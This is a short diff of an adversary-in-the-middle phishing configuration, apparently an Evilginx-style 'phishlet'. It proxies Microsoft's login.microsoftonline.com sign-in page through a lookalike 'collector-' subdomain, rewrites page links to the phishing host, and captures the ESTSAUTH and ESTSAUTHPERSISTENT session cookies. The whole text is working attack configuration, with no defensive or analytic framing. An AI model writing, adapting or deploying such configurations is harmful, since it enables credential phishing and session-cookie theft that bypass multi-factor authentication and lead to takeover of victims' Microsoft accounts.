@@ -1,9 +1,9 @@
 name: 'service2'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: '{{.Endpoint2}}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'collector-{{.Endpoint2}}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
 sub_filters:
-  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '{{.Endpoint2}}.{hostname}'}
+  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: 'collector-{{.Endpoint2}}.{hostname}'}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
